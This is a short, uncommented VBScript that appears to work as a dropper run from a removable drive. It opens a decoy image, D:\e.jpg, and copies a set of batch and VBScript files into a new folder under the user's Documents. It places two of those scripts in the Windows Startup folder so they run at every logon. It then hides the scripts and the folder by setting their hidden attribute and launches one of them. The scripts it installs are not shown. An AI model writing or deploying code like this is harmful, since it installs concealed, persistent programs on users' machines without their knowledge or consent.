dim runn, user, Shell, fso


set runn = WScript.CreateObject("WScript.shell")
runn.run("""D:\e.jpg""")



set Shell = WScript.CreateObject("WScript.Shell")
user = Shell.ExpandEnvironmentStrings("%USERNAME%")


Set fso = CreateObject("Scripting.FileSystemObject")
fso.CreateFolder("C:\users\" + user + "\documents\RR")


fso.CopyFile "D:\RR\10.bat", "C:\users\" + user + "\documents\RR\"
fso.CopyFile "D:\RR\Day.bat", "C:\users\" + user + "\documents\RR\"
fso.CopyFile "D:\RR\RRD.mp4", "C:\users\" + user + "\documents\RR\"
fso.CopyFile "D:\RR\RRrun.bat", "C:\users\" + user + "\documents\RR\"
fso.CopyFile "D:\RR\S10.vbs", "C:\users\" + user + "\documents\RR\"
fso.CopyFile "D:\RR\SDay.vbs", "C:\users\" + user + "\documents\RR\"
fso.CopyFile "D:\RR\SRR.vbs", "C:\users\" + user + "\documents\RR\"
fso.CopyFile "D:\RR\V100.vbs", "C:\users\" + user + "\documents\RR\"



fso.CopyFile "D:\RR\SDay.vbs", "C:\Users\" + user + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"


fso.CopyFile "D:\RR\S10.vbs", "C:\Users\" + user + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"



set objFile1 = fso.GetFile("C:\Users\" + user + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\SDay.vbs")
set objFile2 = fso.GetFile("C:\Users\" + user + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\S10.vbs")
set objFile3 = fso.GetFolder("C:\users\" + user + "\documents\RR\")
objFile1.Attributes = objFile1.Attributes + 2
objFile2.Attributes = objFile2.Attributes + 2
objFile3.Attributes = objFile3.Attributes + 2

runn.run("""D:\RR\SDay.vbs""")